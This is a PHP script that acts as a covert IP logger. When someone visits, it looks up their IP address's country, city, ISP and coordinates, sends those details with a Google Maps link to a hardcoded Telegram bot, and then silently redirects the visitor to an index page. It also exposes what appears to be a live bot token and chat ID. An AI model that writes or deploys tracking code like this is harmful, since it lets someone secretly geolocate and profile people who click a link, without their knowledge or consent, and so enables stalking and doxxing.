<?php
// IP Logger + Telegram Notifier + Google Maps Link

$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=status,message,country,regionName,city,isp,lat,lon,query"));

// Check if request was successful
if ($details->status === "success") {
    $country = $details->country;
    $region = $details->regionName;
    $city = $details->city;
    $isp = $details->isp;
    $latitude = $details->lat;
    $longitude = $details->lon;
    $ipAddress = $details->query;

    // Google Maps link
    $mapLink = "https://www.google.com/maps/search/?api=1&query={$latitude},{$longitude}";

    $message = "👤 *New Visitor Logged*\n\n" .
               "🌐 *IP:* `$ipAddress`\n" .
               "📍 *Country:* $country\n" .
               "🏙 *Region:* $region\n" .
               "🏡 *City:* $city\n" .
               "📡 *ISP:* $isp\n" .
               "🗺 *Location:* [View on Google Maps]($mapLink)";

} else {
    $message = "❌ Failed to retrieve IP info: " . ($details->message ?? 'Unknown error');
}

// Telegram config
$bot_token = '7820044312:AAHCkQkWgzveBoeoht1e1MvDVzx0dWKfnuQ';
$chat_id = '6189803357';

$url = "https://api.telegram.org/bot$bot_token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown', // Enables bold, link, etc.
    'disable_web_page_preview' => true
];

// Send message to Telegram
$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ]
];

$context = stream_context_create($options);
file_get_contents($url, false, $context);

// Redirect to HTML page after logging
header("Location: index.html");
exit;
?>
